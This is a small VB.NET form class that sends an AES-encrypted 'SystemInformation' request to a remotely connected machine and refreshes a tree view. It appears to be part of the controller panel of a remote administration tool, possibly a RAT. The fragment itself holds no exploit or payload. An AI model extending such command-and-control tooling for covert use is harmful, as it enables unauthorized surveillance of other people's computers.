Public Class FormInfo
    Public connected As Connection

#Region "Main info"
    Private Sub RefreshToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RefreshToolStripMenuItem.Click
        connected.Send(New Encryption().AES_Encrypt("SystemInformation", Form1.enckey))
    End Sub
    Private Sub TreeView1_AfterSelect(ByVal sender As Object, ByVal e As TreeViewEventArgs) Handles TreeView1.AfterSelect
        TreeView1.SelectedNode.SelectedImageKey = TreeView1.SelectedNode.ImageKey
    End Sub
#End Region

End Class